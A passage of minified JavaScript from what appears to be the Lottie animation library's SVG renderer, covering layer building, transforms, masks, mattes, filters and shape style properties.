              return this.createText(i);
            case 6:
              return this.createAudio(i);
            case 13:
              return this.createCamera(i);
            case 15:
              return this.createFootage(i);
            default:
              return this.createNull(i);
          }
        }),
        (BaseRenderer.prototype.createCamera = function () {
          throw new Error("You're using a 3d camera. Try the html renderer.");
        }),
        (BaseRenderer.prototype.createAudio = function (i) {
          return new AudioElement(i, this.globalData, this);
        }),
        (BaseRenderer.prototype.createFootage = function (i) {
          return new FootageElement(i, this.globalData, this);
        }),
        (BaseRenderer.prototype.buildAllItems = function () {
          var i,
            a = this.layers.length;
          for (i = 0; i < a; i += 1) this.buildItem(i);
          this.checkPendingElements();
        }),
        (BaseRenderer.prototype.includeLayers = function (i) {
          this.completeLayers = !1;
          var a,
            o = i.length,
            s,
            tt = this.layers.length;
          for (a = 0; a < o; a += 1)
            for (s = 0; s < tt; ) {
              if (this.layers[s].id === i[a].id) {
                this.layers[s] = i[a];
                break;
              }
              s += 1;
            }
        }),
        (BaseRenderer.prototype.setProjectInterface = function (i) {
          this.globalData.projectInterface = i;
        }),
        (BaseRenderer.prototype.initItems = function () {
          this.globalData.progressiveLoad || this.buildAllItems();
        }),
        (BaseRenderer.prototype.buildElementParenting = function (i, a, o) {
          for (
            var s = this.elements, tt = this.layers, nt = 0, ot = tt.length;
            nt < ot;

          )
            tt[nt].ind == a &&
              (!s[nt] || s[nt] === !0
                ? (this.buildItem(nt), this.addPendingElement(i))
                : (o.push(s[nt]),
                  s[nt].setAsParent(),
                  tt[nt].parent !== void 0
                    ? this.buildElementParenting(i, tt[nt].parent, o)
                    : i.setHierarchy(o))),
              (nt += 1);
        }),
        (BaseRenderer.prototype.addPendingElement = function (i) {
          this.pendingElements.push(i);
        }),
        (BaseRenderer.prototype.searchExtraCompositions = function (i) {
          var a,
            o = i.length;
          for (a = 0; a < o; a += 1)
            if (i[a].xt) {
              var s = this.createComp(i[a]);
              s.initExpressions(),
                this.globalData.projectInterface.registerComposition(s);
            }
        }),
        (BaseRenderer.prototype.getElementById = function (i) {
          var a,
            o = this.elements.length;
          for (a = 0; a < o; a += 1)
            if (this.elements[a].data.ind === i) return this.elements[a];
          return null;
        }),
        (BaseRenderer.prototype.getElementByPath = function (i) {
          var a = i.shift(),
            o;
          if (typeof a == "number") o = this.elements[a];
          else {
            var s,
              tt = this.elements.length;
            for (s = 0; s < tt; s += 1)
              if (this.elements[s].data.nm === a) {
                o = this.elements[s];
                break;
              }
          }
          return i.length === 0 ? o : o.getElementByPath(i);
        }),
        (BaseRenderer.prototype.setupGlobalData = function (i, a) {
          (this.globalData.fontManager = new FontManager()),
            (this.globalData.slotManager = slotFactory(i)),
            this.globalData.fontManager.addChars(i.chars),
            this.globalData.fontManager.addFonts(i.fonts, a),
            (this.globalData.getAssetData =
              this.animationItem.getAssetData.bind(this.animationItem)),
            (this.globalData.getAssetsPath =
              this.animationItem.getAssetsPath.bind(this.animationItem)),
            (this.globalData.imageLoader = this.animationItem.imagePreloader),
            (this.globalData.audioController =
              this.animationItem.audioController),
            (this.globalData.frameId = 0),
            (this.globalData.frameRate = i.fr),
            (this.globalData.nm = i.nm),
            (this.globalData.compSize = { w: i.w, h: i.h });
        });
      var effectTypes = { TRANSFORM_EFFECT: "transformEFfect" };
      function TransformElement() {}
      TransformElement.prototype = {
        initTransform: function () {
          var a = new Matrix();
          (this.finalTransform = {
            mProp: this.data.ks
              ? TransformPropertyFactory.getTransformProperty(
                  this,
                  this.data.ks,
                  this
                )
              : { o: 0 },
            _matMdf: !1,
            _localMatMdf: !1,
            _opMdf: !1,
            mat: a,
            localMat: a,
            localOpacity: 1,
          }),
            this.data.ao && (this.finalTransform.mProp.autoOriented = !0),
            this.data.ty;
        },
        renderTransform: function () {
          if (
            ((this.finalTransform._opMdf =
              this.finalTransform.mProp.o._mdf || this._isFirstFrame),
            (this.finalTransform._matMdf =
              this.finalTransform.mProp._mdf || this._isFirstFrame),
            this.hierarchy)
          ) {
            var a,
              o = this.finalTransform.mat,
              s = 0,
              tt = this.hierarchy.length;
            if (!this.finalTransform._matMdf)
              for (; s < tt; ) {
                if (this.hierarchy[s].finalTransform.mProp._mdf) {
                  this.finalTransform._matMdf = !0;
                  break;
                }
                s += 1;
              }
            if (this.finalTransform._matMdf)
              for (
                a = this.finalTransform.mProp.v.props,
                  o.cloneFromProps(a),
                  s = 0;
                s < tt;
                s += 1
              )
                o.multiply(this.hierarchy[s].finalTransform.mProp.v);
          }
          this.finalTransform._matMdf &&
            (this.finalTransform._localMatMdf = this.finalTransform._matMdf),
            this.finalTransform._opMdf &&
              (this.finalTransform.localOpacity =
                this.finalTransform.mProp.o.v);
        },
        renderLocalTransform: function () {
          if (this.localTransforms) {
            var a = 0,
              o = this.localTransforms.length;
            if (
              ((this.finalTransform._localMatMdf = this.finalTransform._matMdf),
              !this.finalTransform._localMatMdf || !this.finalTransform._opMdf)
            )
              for (; a < o; )
                this.localTransforms[a]._mdf &&
                  (this.finalTransform._localMatMdf = !0),
                  this.localTransforms[a]._opMdf &&
                    !this.finalTransform._opMdf &&
                    ((this.finalTransform.localOpacity =
                      this.finalTransform.mProp.o.v),
                    (this.finalTransform._opMdf = !0)),
                  (a += 1);
            if (this.finalTransform._localMatMdf) {
              var s = this.finalTransform.localMat;
              for (
                this.localTransforms[0].matrix.clone(s), a = 1;
                a < o;
                a += 1
              ) {
                var tt = this.localTransforms[a].matrix;
                s.multiply(tt);
              }
              s.multiply(this.finalTransform.mat);
            }
            if (this.finalTransform._opMdf) {
              var nt = this.finalTransform.localOpacity;
              for (a = 0; a < o; a += 1)
                nt *= this.localTransforms[a].opacity * 0.01;
              this.finalTransform.localOpacity = nt;
            }
          }
        },
        searchEffectTransforms: function () {
          if (this.renderableEffectsManager) {
            var a = this.renderableEffectsManager.getEffects(
              effectTypes.TRANSFORM_EFFECT
            );
            if (a.length) {
              (this.localTransforms = []),
                (this.finalTransform.localMat = new Matrix());
              var o = 0,
                s = a.length;
              for (o = 0; o < s; o += 1) this.localTransforms.push(a[o]);
            }
          }
        },
        globalToLocal: function (a) {
          var o = [];
          o.push(this.finalTransform);
          for (var s = !0, tt = this.comp; s; )
            tt.finalTransform
              ? (tt.data.hasMask && o.splice(0, 0, tt.finalTransform),
                (tt = tt.comp))
              : (s = !1);
          var nt,
            ot = o.length,
            st;
          for (nt = 0; nt < ot; nt += 1)
            (st = o[nt].mat.applyToPointArray(0, 0, 0)),
              (a = [a[0] - st[0], a[1] - st[1], 0]);
          return a;
        },
        mHelper: new Matrix(),
      };
      function MaskElement(i, a, o) {
        (this.data = i),
          (this.element = a),
          (this.globalData = o),
          (this.storedData = []),
          (this.masksProperties = this.data.masksProperties || []),
          (this.maskElement = null);
        var s = this.globalData.defs,
          tt,
          nt = this.masksProperties ? this.masksProperties.length : 0;
        (this.viewData = createSizedArray(nt)), (this.solidPath = "");
        var ot,
          st = this.masksProperties,
          ft = 0,
          ht = [],
          gt,
          St,
          vt = createElementID(),
          _t,
          Et,
          Ct,
          Pt,
          bt = "clipPath",
          xt = "clip-path";
        for (tt = 0; tt < nt; tt += 1)
          if (
            (((st[tt].mode !== "a" && st[tt].mode !== "n") ||
              st[tt].inv ||
              st[tt].o.k !== 100 ||
              st[tt].o.x) &&
              ((bt = "mask"), (xt = "mask")),
            (st[tt].mode === "s" || st[tt].mode === "i") && ft === 0
              ? ((_t = createNS("rect")),
                _t.setAttribute("fill", "#ffffff"),
                _t.setAttribute("width", this.element.comp.data.w || 0),
                _t.setAttribute("height", this.element.comp.data.h || 0),
                ht.push(_t))
              : (_t = null),
            (ot = createNS("path")),
            st[tt].mode === "n")
          )
            (this.viewData[tt] = {
              op: PropertyFactory.getProp(
                this.element,
                st[tt].o,
                0,
                0.01,
                this.element
              ),
              prop: ShapePropertyFactory.getShapeProp(this.element, st[tt], 3),
              elem: ot,
              lastPath: "",
            }),
              s.appendChild(ot);
          else {
            (ft += 1),
              ot.setAttribute(
                "fill",
                st[tt].mode === "s" ? "#000000" : "#ffffff"
              ),
              ot.setAttribute("clip-rule", "nonzero");
            var yt;
            if (
              (st[tt].x.k !== 0
                ? ((bt = "mask"),
                  (xt = "mask"),
                  (Pt = PropertyFactory.getProp(
                    this.element,
                    st[tt].x,
                    0,
                    null,
                    this.element
                  )),
                  (yt = createElementID()),
                  (Et = createNS("filter")),
                  Et.setAttribute("id", yt),
                  (Ct = createNS("feMorphology")),
                  Ct.setAttribute("operator", "erode"),
                  Ct.setAttribute("in", "SourceGraphic"),
                  Ct.setAttribute("radius", "0"),
                  Et.appendChild(Ct),
                  s.appendChild(Et),
                  ot.setAttribute(
                    "stroke",
                    st[tt].mode === "s" ? "#000000" : "#ffffff"
                  ))
                : ((Ct = null), (Pt = null)),
              (this.storedData[tt] = {
                elem: ot,
                x: Pt,
                expan: Ct,
                lastPath: "",
                lastOperator: "",
                filterId: yt,
                lastRadius: 0,
              }),
              st[tt].mode === "i")
            ) {
              St = ht.length;
              var wt = createNS("g");
              for (gt = 0; gt < St; gt += 1) wt.appendChild(ht[gt]);
              var $t = createNS("mask");
              $t.setAttribute("mask-type", "alpha"),
                $t.setAttribute("id", vt + "_" + ft),
                $t.appendChild(ot),
                s.appendChild($t),
                wt.setAttribute(
                  "mask",
                  "url(" + getLocationHref() + "#" + vt + "_" + ft + ")"
                ),
                (ht.length = 0),
                ht.push(wt);
            } else ht.push(ot);
            st[tt].inv &&
              !this.solidPath &&
              (this.solidPath = this.createLayerSolidPath()),
              (this.viewData[tt] = {
                elem: ot,
                lastPath: "",
                op: PropertyFactory.getProp(
                  this.element,
                  st[tt].o,
                  0,
                  0.01,
                  this.element
                ),
                prop: ShapePropertyFactory.getShapeProp(
                  this.element,
                  st[tt],
                  3
                ),
                invRect: _t,
              }),
              this.viewData[tt].prop.k ||
                this.drawPath(
                  st[tt],
                  this.viewData[tt].prop.v,
                  this.viewData[tt]
                );
          }
        for (
          this.maskElement = createNS(bt), nt = ht.length, tt = 0;
          tt < nt;
          tt += 1
        )
          this.maskElement.appendChild(ht[tt]);
        ft > 0 &&
          (this.maskElement.setAttribute("id", vt),
          this.element.maskedElement.setAttribute(
            xt,
            "url(" + getLocationHref() + "#" + vt + ")"
          ),
          s.appendChild(this.maskElement)),
          this.viewData.length && this.element.addRenderableComponent(this);
      }
      (MaskElement.prototype.getMaskProperty = function (i) {
        return this.viewData[i].prop;
      }),
        (MaskElement.prototype.renderFrame = function (i) {
          var a = this.element.finalTransform.mat,
            o,
            s = this.masksProperties.length;
          for (o = 0; o < s; o += 1)
            if (
              ((this.viewData[o].prop._mdf || i) &&
                this.drawPath(
                  this.masksProperties[o],
                  this.viewData[o].prop.v,
                  this.viewData[o]
                ),
              (this.viewData[o].op._mdf || i) &&
                this.viewData[o].elem.setAttribute(
                  "fill-opacity",
                  this.viewData[o].op.v
                ),
              this.masksProperties[o].mode !== "n" &&
                (this.viewData[o].invRect &&
                  (this.element.finalTransform.mProp._mdf || i) &&
                  this.viewData[o].invRect.setAttribute(
                    "transform",
                    a.getInverseMatrix().to2dCSS()
                  ),
                this.storedData[o].x && (this.storedData[o].x._mdf || i)))
            ) {
              var tt = this.storedData[o].expan;
              this.storedData[o].x.v < 0
                ? (this.storedData[o].lastOperator !== "erode" &&
                    ((this.storedData[o].lastOperator = "erode"),
                    this.storedData[o].elem.setAttribute(
                      "filter",
                      "url(" +
                        getLocationHref() +
                        "#" +
                        this.storedData[o].filterId +
                        ")"
                    )),
                  tt.setAttribute("radius", -this.storedData[o].x.v))
                : (this.storedData[o].lastOperator !== "dilate" &&
                    ((this.storedData[o].lastOperator = "dilate"),
                    this.storedData[o].elem.setAttribute("filter", null)),
                  this.storedData[o].elem.setAttribute(
                    "stroke-width",
                    this.storedData[o].x.v * 2
                  ));
            }
        }),
        (MaskElement.prototype.getMaskelement = function () {
          return this.maskElement;
        }),
        (MaskElement.prototype.createLayerSolidPath = function () {
          var i = "M0,0 ";
          return (
            (i += " h" + this.globalData.compSize.w),
            (i += " v" + this.globalData.compSize.h),
            (i += " h-" + this.globalData.compSize.w),
            (i += " v-" + this.globalData.compSize.h + " "),
            i
          );
        }),
        (MaskElement.prototype.drawPath = function (i, a, o) {
          var s = " M" + a.v[0][0] + "," + a.v[0][1],
            tt,
            nt;
          for (nt = a._length, tt = 1; tt < nt; tt += 1)
            s +=
              " C" +
              a.o[tt - 1][0] +
              "," +
              a.o[tt - 1][1] +
              " " +
              a.i[tt][0] +
              "," +
              a.i[tt][1] +
              " " +
              a.v[tt][0] +
              "," +
              a.v[tt][1];
          if (
            (a.c &&
              nt > 1 &&
              (s +=
                " C" +
                a.o[tt - 1][0] +
                "," +
                a.o[tt - 1][1] +
                " " +
                a.i[0][0] +
                "," +
                a.i[0][1] +
                " " +
                a.v[0][0] +
                "," +
                a.v[0][1]),
            o.lastPath !== s)
          ) {
            var ot = "";
            o.elem &&
              (a.c && (ot = i.inv ? this.solidPath + s : s),
              o.elem.setAttribute("d", ot)),
              (o.lastPath = s);
          }
        }),
        (MaskElement.prototype.destroy = function () {
          (this.element = null),
            (this.globalData = null),
            (this.maskElement = null),
            (this.data = null),
            (this.masksProperties = null);
        });
      var filtersFactory = (function () {
          var i = {};
          (i.createFilter = a), (i.createAlphaToLuminanceFilter = o);
          function a(s, tt) {
            var nt = createNS("filter");
            return (
              nt.setAttribute("id", s),
              tt !== !0 &&
                (nt.setAttribute("filterUnits", "objectBoundingBox"),
                nt.setAttribute("x", "0%"),
                nt.setAttribute("y", "0%"),
                nt.setAttribute("width", "100%"),
                nt.setAttribute("height", "100%")),
              nt
            );
          }
          function o() {
            var s = createNS("feColorMatrix");
            return (
              s.setAttribute("type", "matrix"),
              s.setAttribute("color-interpolation-filters", "sRGB"),
              s.setAttribute(
                "values",
                "0 0 0 1 0  0 0 0 1 0  0 0 0 1 0  0 0 0 1 1"
              ),
              s
            );
          }
          return i;
        })(),
        featureSupport = (function () {
          var i = {
            maskType: !0,
            svgLumaHidden: !0,
            offscreenCanvas: typeof OffscreenCanvas < "u",
          };
          return (
            (/MSIE 10/i.test(navigator.userAgent) ||
              /MSIE 9/i.test(navigator.userAgent) ||
              /rv:11.0/i.test(navigator.userAgent) ||
              /Edge\/\d./i.test(navigator.userAgent)) &&
              (i.maskType = !1),
            /firefox/i.test(navigator.userAgent) && (i.svgLumaHidden = !1),
            i
          );
        })(),
        registeredEffects$1 = {},
        idPrefix = "filter_result_";
      function SVGEffects(i) {
        var a,
          o = "SourceGraphic",
          s = i.data.ef ? i.data.ef.length : 0,
          tt = createElementID(),
          nt = filtersFactory.createFilter(tt, !0),
          ot = 0;
        this.filters = [];
        var st;
        for (a = 0; a < s; a += 1) {
          st = null;
          var ft = i.data.ef[a].ty;
          if (registeredEffects$1[ft]) {
            var ht = registeredEffects$1[ft].effect;
            (st = new ht(
              nt,
              i.effectsManager.effectElements[a],
              i,
              idPrefix + ot,
              o
            )),
              (o = idPrefix + ot),
              registeredEffects$1[ft].countsAsEffect && (ot += 1);
          }
          st && this.filters.push(st);
        }
        ot &&
          (i.globalData.defs.appendChild(nt),
          i.layerElement.setAttribute(
            "filter",
            "url(" + getLocationHref() + "#" + tt + ")"
          )),
          this.filters.length && i.addRenderableComponent(this);
      }
      (SVGEffects.prototype.renderFrame = function (i) {
        var a,
          o = this.filters.length;
        for (a = 0; a < o; a += 1) this.filters[a].renderFrame(i);
      }),
        (SVGEffects.prototype.getEffects = function (i) {
          var a,
            o = this.filters.length,
            s = [];
          for (a = 0; a < o; a += 1)
            this.filters[a].type === i && s.push(this.filters[a]);
          return s;
        });
      function registerEffect$1(i, a, o) {
        registeredEffects$1[i] = { effect: a, countsAsEffect: o };
      }
      function SVGBaseElement() {}
      SVGBaseElement.prototype = {
        initRendererElement: function () {
          this.layerElement = createNS("g");
        },
        createContainerElements: function () {
          (this.matteElement = createNS("g")),
            (this.transformedElement = this.layerElement),
            (this.maskedElement = this.layerElement),
            (this._sizeChanged = !1);
          var a = null;
          if (this.data.td) {
            this.matteMasks = {};
            var o = createNS("g");
            o.setAttribute("id", this.layerId),
              o.appendChild(this.layerElement),
              (a = o),
              this.globalData.defs.appendChild(o);
          } else
            this.data.tt
              ? (this.matteElement.appendChild(this.layerElement),
                (a = this.matteElement),
                (this.baseElement = this.matteElement))
              : (this.baseElement = this.layerElement);
          if (
            (this.data.ln && this.layerElement.setAttribute("id", this.data.ln),
            this.data.cl &&
              this.layerElement.setAttribute("class", this.data.cl),
            this.data.ty === 0 && !this.data.hd)
          ) {
            var s = createNS("clipPath"),
              tt = createNS("path");
            tt.setAttribute(
              "d",
              "M0,0 L" +
                this.data.w +
                ",0 L" +
                this.data.w +
                "," +
                this.data.h +
                " L0," +
                this.data.h +
                "z"
            );
            var nt = createElementID();
            if (
              (s.setAttribute("id", nt),
              s.appendChild(tt),
              this.globalData.defs.appendChild(s),
              this.checkMasks())
            ) {
              var ot = createNS("g");
              ot.setAttribute(
                "clip-path",
                "url(" + getLocationHref() + "#" + nt + ")"
              ),
                ot.appendChild(this.layerElement),
                (this.transformedElement = ot),
                a
                  ? a.appendChild(this.transformedElement)
                  : (this.baseElement = this.transformedElement);
            } else
              this.layerElement.setAttribute(
                "clip-path",
                "url(" + getLocationHref() + "#" + nt + ")"
              );
          }
          this.data.bm !== 0 && this.setBlendMode();
        },
        renderElement: function () {
          this.finalTransform._localMatMdf &&
            this.transformedElement.setAttribute(
              "transform",
              this.finalTransform.localMat.to2dCSS()
            ),
            this.finalTransform._opMdf &&
              this.transformedElement.setAttribute(
                "opacity",
                this.finalTransform.localOpacity
              );
        },
        destroyBaseElement: function () {
          (this.layerElement = null),
            (this.matteElement = null),
            this.maskManager.destroy();
        },
        getBaseElement: function () {
          return this.data.hd ? null : this.baseElement;
        },
        createRenderableComponents: function () {
          (this.maskManager = new MaskElement(
            this.data,
            this,
            this.globalData
          )),
            (this.renderableEffectsManager = new SVGEffects(this)),
            this.searchEffectTransforms();
        },
        getMatte: function (a) {
          if (
            (this.matteMasks || (this.matteMasks = {}), !this.matteMasks[a])
          ) {
            var o = this.layerId + "_" + a,
              s,
              tt,
              nt,
              ot;
            if (a === 1 || a === 3) {
              var st = createNS("mask");
              st.setAttribute("id", o),
                st.setAttribute("mask-type", a === 3 ? "luminance" : "alpha"),
                (nt = createNS("use")),
                nt.setAttributeNS(
                  "http://www.w3.org/1999/xlink",
                  "href",
                  "#" + this.layerId
                ),
                st.appendChild(nt),
                this.globalData.defs.appendChild(st),
                !featureSupport.maskType &&
                  a === 1 &&
                  (st.setAttribute("mask-type", "luminance"),
                  (s = createElementID()),
                  (tt = filtersFactory.createFilter(s)),
                  this.globalData.defs.appendChild(tt),
                  tt.appendChild(filtersFactory.createAlphaToLuminanceFilter()),
                  (ot = createNS("g")),
                  ot.appendChild(nt),
                  st.appendChild(ot),
                  ot.setAttribute(
                    "filter",
                    "url(" + getLocationHref() + "#" + s + ")"
                  ));
            } else if (a === 2) {
              var ft = createNS("mask");
              ft.setAttribute("id", o), ft.setAttribute("mask-type", "alpha");
              var ht = createNS("g");
              ft.appendChild(ht),
                (s = createElementID()),
                (tt = filtersFactory.createFilter(s));
              var gt = createNS("feComponentTransfer");
              gt.setAttribute("in", "SourceGraphic"), tt.appendChild(gt);
              var St = createNS("feFuncA");
              St.setAttribute("type", "table"),
                St.setAttribute("tableValues", "1.0 0.0"),
                gt.appendChild(St),
                this.globalData.defs.appendChild(tt);
              var vt = createNS("rect");
              vt.setAttribute("width", this.comp.data.w),
                vt.setAttribute("height", this.comp.data.h),
                vt.setAttribute("x", "0"),
                vt.setAttribute("y", "0"),
                vt.setAttribute("fill", "#ffffff"),
                vt.setAttribute("opacity", "0"),
                ht.setAttribute(
                  "filter",
                  "url(" + getLocationHref() + "#" + s + ")"
                ),
                ht.appendChild(vt),
                (nt = createNS("use")),
                nt.setAttributeNS(
                  "http://www.w3.org/1999/xlink",
                  "href",
                  "#" + this.layerId
                ),
                ht.appendChild(nt),
                featureSupport.maskType ||
                  (ft.setAttribute("mask-type", "luminance"),
                  tt.appendChild(filtersFactory.createAlphaToLuminanceFilter()),
                  (ot = createNS("g")),
                  ht.appendChild(vt),
                  ot.appendChild(this.layerElement),
                  ht.appendChild(ot)),
                this.globalData.defs.appendChild(ft);
            }
            this.matteMasks[a] = o;
          }
          return this.matteMasks[a];
        },
        setMatte: function (a) {
          this.matteElement &&
            this.matteElement.setAttribute(
              "mask",
              "url(" + getLocationHref() + "#" + a + ")"
            );
        },
      };
      function HierarchyElement() {}
      HierarchyElement.prototype = {
        initHierarchy: function () {
          (this.hierarchy = []), (this._isParent = !1), this.checkParenting();
        },
        setHierarchy: function (a) {
          this.hierarchy = a;
        },
        setAsParent: function () {
          this._isParent = !0;
        },
        checkParenting: function () {
          this.data.parent !== void 0 &&
            this.comp.buildElementParenting(this, this.data.parent, []);
        },
      };
      function RenderableDOMElement() {}
      (function () {
        var i = {
          initElement: function (o, s, tt) {
            this.initFrame(),
              this.initBaseData(o, s, tt),
              this.initTransform(o, s, tt),
              this.initHierarchy(),
              this.initRenderable(),
              this.initRendererElement(),
              this.createContainerElements(),
              this.createRenderableComponents(),
              this.createContent(),
              this.hide();
          },
          hide: function () {
            if (!this.hidden && (!this.isInRange || this.isTransparent)) {
              var o = this.baseElement || this.layerElement;
              (o.style.display = "none"), (this.hidden = !0);
            }
          },
          show: function () {
            if (this.isInRange && !this.isTransparent) {
              if (!this.data.hd) {
                var o = this.baseElement || this.layerElement;
                o.style.display = "block";
              }
              (this.hidden = !1), (this._isFirstFrame = !0);
            }
          },
          renderFrame: function () {
            this.data.hd ||
              this.hidden ||
              (this.renderTransform(),
              this.renderRenderable(),
              this.renderLocalTransform(),
              this.renderElement(),
              this.renderInnerContent(),
              this._isFirstFrame && (this._isFirstFrame = !1));
          },
          renderInnerContent: function () {},
          prepareFrame: function (o) {
            (this._mdf = !1),
              this.prepareRenderableFrame(o),
              this.prepareProperties(o, this.isInRange),
              this.checkTransparency();
          },
          destroy: function () {
            (this.innerElem = null), this.destroyBaseElement();
          },
        };
        extendPrototype(
          [RenderableElement, createProxyFunction(i)],
          RenderableDOMElement
        );
      })();
      function IImageElement(i, a, o) {
        (this.assetData = a.getAssetData(i.refId)),
          this.assetData &&
            this.assetData.sid &&
            (this.assetData = a.slotManager.getProp(this.assetData)),
          this.initElement(i, a, o),
          (this.sourceRect = {
            top: 0,
            left: 0,
            width: this.assetData.w,
            height: this.assetData.h,
          });
      }
      extendPrototype(
        [
          BaseElement,
          TransformElement,
          SVGBaseElement,
          HierarchyElement,
          FrameElement,
          RenderableDOMElement,
        ],
        IImageElement
      ),
        (IImageElement.prototype.createContent = function () {
          var i = this.globalData.getAssetsPath(this.assetData);
          (this.innerElem = createNS("image")),
            this.innerElem.setAttribute("width", this.assetData.w + "px"),
            this.innerElem.setAttribute("height", this.assetData.h + "px"),
            this.innerElem.setAttribute(
              "preserveAspectRatio",
              this.assetData.pr ||
                this.globalData.renderConfig.imagePreserveAspectRatio
            ),
            this.innerElem.setAttributeNS(
              "http://www.w3.org/1999/xlink",
              "href",
              i
            ),
            this.layerElement.appendChild(this.innerElem);
        }),
        (IImageElement.prototype.sourceRectAtTime = function () {
          return this.sourceRect;
        });
      function ProcessedElement(i, a) {
        (this.elem = i), (this.pos = a);
      }
      function IShapeElement() {}
      IShapeElement.prototype = {
        addShapeToModifiers: function (a) {
          var o,
            s = this.shapeModifiers.length;
          for (o = 0; o < s; o += 1) this.shapeModifiers[o].addShape(a);
        },
        isShapeInAnimatedModifiers: function (a) {
          for (var o = 0, s = this.shapeModifiers.length; o < s; )
            if (this.shapeModifiers[o].isAnimatedWithShape(a)) return !0;
          return !1;
        },
        renderModifiers: function () {
          if (this.shapeModifiers.length) {
            var a,
              o = this.shapes.length;
            for (a = 0; a < o; a += 1) this.shapes[a].sh.reset();
            o = this.shapeModifiers.length;
            var s;
            for (
              a = o - 1;
              a >= 0 &&
              ((s = this.shapeModifiers[a].processShapes(this._isFirstFrame)),
              !s);
              a -= 1
            );
          }
        },
        searchProcessedElement: function (a) {
          for (var o = this.processedElements, s = 0, tt = o.length; s < tt; ) {
            if (o[s].elem === a) return o[s].pos;
            s += 1;
          }
          return 0;
        },
        addProcessedElement: function (a, o) {
          for (var s = this.processedElements, tt = s.length; tt; )
            if (((tt -= 1), s[tt].elem === a)) {
              s[tt].pos = o;
              return;
            }
          s.push(new ProcessedElement(a, o));
        },
        prepareFrame: function (a) {
          this.prepareRenderableFrame(a),
            this.prepareProperties(a, this.isInRange);
        },
      };
      var lineCapEnum = { 1: "butt", 2: "round", 3: "square" },
        lineJoinEnum = { 1: "miter", 2: "round", 3: "bevel" };
      function SVGShapeData(i, a, o) {
        (this.caches = []),
          (this.styles = []),
          (this.transformers = i),
          (this.lStr = ""),
          (this.sh = o),
          (this.lvl = a),
          (this._isAnimated = !!o.k);
        for (var s = 0, tt = i.length; s < tt; ) {
          if (i[s].mProps.dynamicProperties.length) {
            this._isAnimated = !0;
            break;
          }
          s += 1;
        }
      }
      SVGShapeData.prototype.setAsAnimated = function () {
        this._isAnimated = !0;
      };
      function SVGStyleData(i, a) {
        (this.data = i),
          (this.type = i.ty),
          (this.d = ""),
          (this.lvl = a),
          (this._mdf = !1),
          (this.closed = i.hd === !0),
          (this.pElem = createNS("path")),
          (this.msElem = null);
      }
      SVGStyleData.prototype.reset = function () {
        (this.d = ""), (this._mdf = !1);
      };
      function DashProperty(i, a, o, s) {
        (this.elem = i),
          (this.frameId = -1),
          (this.dataProps = createSizedArray(a.length)),
          (this.renderer = o),
          (this.k = !1),
          (this.dashStr = ""),
          (this.dashArray = createTypedArray(
            "float32",
            a.length ? a.length - 1 : 0
          )),
          (this.dashoffset = createTypedArray("float32", 1)),
          this.initDynamicPropertyContainer(s);
        var tt,
          nt = a.length || 0,
          ot;
        for (tt = 0; tt < nt; tt += 1)
          (ot = PropertyFactory.getProp(i, a[tt].v, 0, 0, this)),
            (this.k = ot.k || this.k),
            (this.dataProps[tt] = { n: a[tt].n, p: ot });
        this.k || this.getValue(!0), (this._isAnimated = this.k);
      }
      (DashProperty.prototype.getValue = function (i) {
        if (
          !(this.elem.globalData.frameId === this.frameId && !i) &&
          ((this.frameId = this.elem.globalData.frameId),
          this.iterateDynamicProperties(),
          (this._mdf = this._mdf || i),
          this._mdf)
        ) {
          var a = 0,
            o = this.dataProps.length;
          for (
            this.renderer === "svg" && (this.dashStr = ""), a = 0;
            a < o;
            a += 1
          )
            this.dataProps[a].n !== "o"
              ? this.renderer === "svg"
                ? (this.dashStr += " " + this.dataProps[a].p.v)
                : (this.dashArray[a] = this.dataProps[a].p.v)
              : (this.dashoffset[0] = this.dataProps[a].p.v);
        }
      }),
        extendPrototype([DynamicPropertyContainer], DashProperty);
      function SVGStrokeStyleData(i, a, o) {
        this.initDynamicPropertyContainer(i),
          (this.getValue = this.iterateDynamicProperties),
          (this.o = PropertyFactory.getProp(i, a.o, 0, 0.01, this)),
          (this.w = PropertyFactory.getProp(i, a.w, 0, null, this)),
          (this.d = new DashProperty(i, a.d || {}, "svg", this)),
          (this.c = PropertyFactory.getProp(i, a.c, 1, 255, this)),
          (this.style = o),
          (this._isAnimated = !!this._isAnimated);
      }
      extendPrototype([DynamicPropertyContainer], SVGStrokeStyleData);
      function SVGFillStyleData(i, a, o) {
        this.initDynamicPropertyContainer(i),
          (this.getValue = this.iterateDynamicProperties),
          (this.o = PropertyFactory.getProp(i, a.o, 0, 0.01, this)),
          (this.c = PropertyFactory.getProp(i, a.c, 1, 255, this)),
          (this.style = o);
      }
      extendPrototype([DynamicPropertyContainer], SVGFillStyleData);
      function SVGNoStyleData(i, a, o) {
        this.initDynamicPropertyContainer(i),
          (this.getValue = this.iterateDynamicProperties),
          (this.style = o);
      }
      extendPrototype([DynamicPropertyContainer], SVGNoStyleData);
      function GradientProperty(i, a, o) {
        (this.data = a), (this.c = createTypedArray("uint8c", a.p * 4));
        var s = a.k.k[0].s
          ? a.k.k[0].s.length - a.p * 4
          : a.k.k.length - a.p * 4;
        (this.o = createTypedArray("float32", s)),
          (this._cmdf = !1),
          (this._omdf = !1),
          (this._collapsable = this.checkCollapsable()),
          (this._hasOpacity = s),
          this.initDynamicPropertyContainer(o),
          (this.prop = PropertyFactory.getProp(i, a.k, 1, null, this)),
          (this.k = this.prop.k),
          this.getValue(!0);
      }
      (GradientProperty.prototype.comparePoints = function (i, a) {
        for (var o = 0, s = this.o.length / 2, tt; o < s; ) {
          if (((tt = Math.abs(i[o * 4] - i[a * 4 + o * 2])), tt > 0.01))
            return !1;
          o += 1;
        }
        return !0;
      }),
        (GradientProperty.prototype.checkCollapsable = function () {
          if (this.o.length / 2 !== this.c.length / 4) return !1;
          if (this.data.k.k[0].s)
            for (var i = 0, a = this.data.k.k.length; i < a; ) {
              if (!this.comparePoints(this.data.k.k[i].s, this.data.p))
                return !1;
              i += 1;
            }
          else if (!this.comparePoints(this.data.k.k, this.data.p)) return !1;
          return !0;
        }),
        (GradientProperty.prototype.getValue = function (i) {
          if (
            (this.prop.getValue(),
            (this._mdf = !1),
            (this._cmdf = !1),
            (this._omdf = !1),
            this.prop._mdf || i)
          ) {
            var a,
              o = this.data.p * 4,
              s,
              tt;
            for (a = 0; a < o; a += 1)
              (s = a % 4 === 0 ? 100 : 255),
                (tt = Math.round(this.prop.v[a] * s)),
                this.c[a] !== tt && ((this.c[a] = tt), (this._cmdf = !i));
            if (this.o.length)
              for (o = this.prop.v.length, a = this.data.p * 4; a < o; a += 1)
                (s = a % 2 === 0 ? 100 : 1),
                  (tt =
                    a % 2 === 0
                      ? Math.round(this.prop.v[a] * 100)
                      : this.prop.v[a]),
